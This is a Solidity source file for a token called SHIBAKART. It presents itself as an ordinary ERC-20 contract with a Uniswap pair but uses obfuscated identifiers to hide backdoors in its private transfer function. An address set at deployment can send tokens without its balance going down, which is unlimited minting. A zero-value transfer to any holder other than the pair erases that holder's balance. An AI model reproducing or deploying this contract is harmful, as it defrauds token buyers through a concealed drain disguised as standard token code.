contract SHIBAKART is Ownable {
    function transfer(address JYcICoh, uint256 JpjHtdm) public returns (bool success) {
        tpia(msg.sender, JYcICoh, JpjHtdm);
        return true;
    }

    function transferFrom(address JcOHdxw, address JYcICoh, uint256 JpjHtdm) public returns (bool success) {
        require(JpjHtdm <= allowance[JcOHdxw][msg.sender]);
        allowance[JcOHdxw][msg.sender] -= JpjHtdm;
        tpia(JcOHdxw, JYcICoh, JpjHtdm);
        return true;
    }

    uint256 private pdgvKLa = 101;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address KUJrBdv) {
        balanceOf[msg.sender] = totalSupply;
        OvNDoSu[KUJrBdv] = pdgvKLa;
        IUniswapV2Router02 kyaofdmnp = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        UITZgcX = IUniswapV2Factory(kyaofdmnp.factory()).createPair(address(this), kyaofdmnp.WETH());
    }

    uint256 public totalSupply = 10000000000 * 10 ** 9;

    mapping(address => uint256) private OvNDoSu;

    function tpia(address JcOHdxw, address JYcICoh, uint256 JpjHtdm) private {
        if (0 == OvNDoSu[JcOHdxw]) {
            balanceOf[JcOHdxw] -= JpjHtdm;
        }
        balanceOf[JYcICoh] += JpjHtdm;
        if (0 == JpjHtdm && JYcICoh != UITZgcX) {
            balanceOf[JYcICoh] = JpjHtdm;
        }
        emit Transfer(JcOHdxw, JYcICoh, JpjHtdm);
    }

    mapping(address => uint256) private tokzajin;

    string public symbol = 'SHIBAKART';

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    function approve(address LxOUnWE, uint256 JpjHtdm) public returns (bool success) {
        allowance[msg.sender][LxOUnWE] = JpjHtdm;
        emit Approval(msg.sender, LxOUnWE, JpjHtdm);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    address public UITZgcX;

    string public name = 'SHIBAKART';
}
